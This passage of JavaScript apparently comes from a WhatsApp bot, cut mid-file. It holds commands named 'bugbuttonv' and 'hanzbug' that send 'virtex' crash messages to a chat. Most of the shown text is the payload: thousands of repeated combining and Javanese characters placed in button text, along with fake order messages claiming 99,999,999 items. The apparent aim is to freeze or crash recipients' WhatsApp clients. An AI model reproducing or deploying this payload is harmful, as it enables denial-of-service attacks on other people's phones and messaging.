ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ𝟗𝟗𝟗`,}, type: 1}
				    ]
					let buttonMessageh = {
						contentText: `🎩HANZ々OFC彡🎩\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nhttps://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
						bodyText: virtex3(prefix),
						footerText: virtex7(prefix),
						buttons: buttons,
						headerType: 4,
						...mdia
					}
					Hanz.sendMessage(from, buttonMessageh, MessageType.buttonsMessage, { 
                 quoted: {
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1
                ,surface: 10,
                orderTitle: 'bugbuttonv', //
                sellerJid: '0@s.whatsapp.net'
                }}}})
					break	
//ᗷᑌᘜ ᗷᑌTTOᑎ ᒪOKᗩՏI ᐯ1
					case 'hanzbug':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')					
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
        sendButtonLocation(from,
        '⏳HANZ々OFC彡⏳\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nhttps://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬', 
        `BUGBOT KOK RASA CACING~😎\n${ha(prefix)}`, {
        jpegThumbnail:fs.readFileSync(`./media/virgam.jpeg`)},
        [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,
        buttonText: {displayText: `${virtex2(prefix)}${virtex7(prefix)}${virtex3(prefix)}᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ